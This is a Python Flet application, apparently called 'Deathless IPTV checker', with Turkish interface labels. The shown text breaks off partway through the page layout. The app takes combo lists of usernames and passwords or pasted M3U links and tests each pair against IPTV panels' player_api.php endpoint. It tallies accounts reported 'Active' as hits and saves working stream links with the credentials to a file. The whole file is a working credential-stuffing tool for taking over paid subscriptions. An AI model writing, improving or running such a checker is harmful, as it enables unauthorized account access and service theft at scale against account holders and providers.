import flet as ft
import requests
import re
import os

def main(page: ft.Page):
    page.title = "Deathless IPTV"
    page.theme_mode = ft.ThemeMode.DARK
    page.scroll = ft.ScrollMode.AUTO
    
    # UI Elemanları
    lbl_title = ft.Text("DEATHLESS CHECKER", size=30, weight="bold", color="indigo")
    lbl_hit = ft.Text("0", size=40, color="green", weight="bold")
    lbl_bad = ft.Text("0", size=40, color="red", weight="bold")
    
    txt_m3u = ft.TextField(label="M3U Linkleri", multiline=True, min_lines=3)
    txt_combo = ft.TextField(label="Combo (user:pass)", multiline=True, min_lines=3)
    txt_panel = ft.TextField(label="Panel Adresi (http://site:port)", hint_text="http://url:8080")
    
    hits = []

    def save_data(e):
        if not hits:
            page.snack_bar = ft.SnackBar(ft.Text("Kaydedilecek HIT yok!"))
            page.snack_bar.open = True
            page.update()
            return
            
        content = "\n".join(hits)
        filename = f"Deathless-{len(hits)}Hit.txt"
        
        # Android path
        path = f"/storage/emulated/0/Download/{filename}"
        
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(content)
            page.snack_bar = ft.SnackBar(ft.Text(f"Kaydedildi: {path}"))
        except:
            # PC path fallback
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)
            page.snack_bar = ft.SnackBar(ft.Text("Kaydedildi (Yerel)"))
            
        page.snack_bar.open = True
        page.update()

    def check_url(url):
        try:
            res = requests.get(url, timeout=5).json()
            if res.get("user_info", {}).get("status") == "Active":
                return True
        except:
            pass
        return False

    def start_check(e):
        hits.clear()
        hit_count = 0
        bad_count = 0
        
        # Combo Modu
        if txt_combo.value and txt_panel.value:
            lines = txt_combo.value.splitlines()
            base = txt_panel.value.strip()
            for line in lines:
                if ":" in line:
                    u, p = line.split(":")[0], line.split(":")[1]
                    target = f"{base}/player_api.php?username={u}&password={p}"
                    if check_url(target):
                        hit_count += 1
                        full_link = f"{base}/get.php?username={u}&password={p}&type=m3u_plus"
                        hits.append(full_link)
                        lbl_hit.value = str(hit_count)
                    else:
                        bad_count += 1
                        lbl_bad.value = str(bad_count)
                    page.update()
        
        # M3U Modu
        elif txt_m3u.value:
            lines = txt_m3u.value.splitlines()
            for line in lines:
                if "username=" in line:
                    try:
                        # Linki ayrıştır ve API formatına çevir
                        base_match = re.search(r'(http://.*?)/', line)
                        user_match = re.search(r'username=([^&]*)', line)
                        pass_match = re.search(r'password=([^&]*)', line)
                        
                        if base_match and user_match and pass_match:
                            base = base_match.group(1)
                            u = user_match.group(1)
                            p = pass_match.group(1)
                            
                            target = f"{base}/player_api.php?username={u}&password={p}"
                            if check_url(target):
                                hit_count += 1
                                hits.append(line.strip())
                                lbl_hit.value = str(hit_count)
                            else:
                                bad_count += 1
                                lbl_bad.value = str(bad_count)
                            page.update()
                    except:
                        pass

    # Sayfa Düzeni
    page.add(
        ft.Column([
            lbl_title,
            ft.Row([
                ft.Column([ft.Text("HIT"), lbl_hit]),
                ft.Column([ft.Text("BAD"), lbl_bad])
            ], alignment=ft.MainAxisAlignment.SPACE_AROUND),
            ft.Tabs(tabs=[
                ft.Tab(text="Link", content=ft.Container(content=txt_m3u, padding=10)),
                ft.Tab(text="Combo", content=ft
